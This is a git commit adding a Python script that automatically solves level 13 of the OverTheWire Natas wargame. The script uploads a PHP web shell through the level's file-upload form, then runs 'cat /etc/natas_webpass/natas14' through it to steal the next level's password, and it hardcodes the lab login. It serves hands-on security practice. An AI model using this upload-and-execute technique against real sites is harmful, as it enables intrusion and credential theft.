d5211c59d8434d3c65f0a54597d7105063b6fb76
Imran Thoufeeque <75982271+I7Z3R0@users.noreply.github.com>
2021-05-18 04:40:47 +0530

    Add files via upload

---
+++ Natas/natas13_auto_pwn.py
@@ -0,0 +1,16 @@
+from pwn import *
+import requests
+import re
+
+username = "natas13"
+password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
+url = "http://{}.natas.labs.overthewire.org".format(username)
+
+log.progress("Getting the natas14 password, Hold on! ")
+session = requests.session()
+upload = session.post(url  , files = {"uploadedfile": open('C:\\test\\revshell13.php','rb')}, data = {"filename" : "revshell.php", "MAX_FILE_SIZE" : "1000" },  auth = (username, password)).text
+content = re.findall('(.*)>upload', upload)
+location = re.findall('upload/(.*)"', str(content))
+filename = location[0]
+web = session.get(url + "/upload/{}?a=cat /etc/natas_webpass/natas14".format(filename) , auth = (username, password)).text
+print("The password for natas14 is === " + re.findall("[A-Za-z0-9]{32}", web)[0])
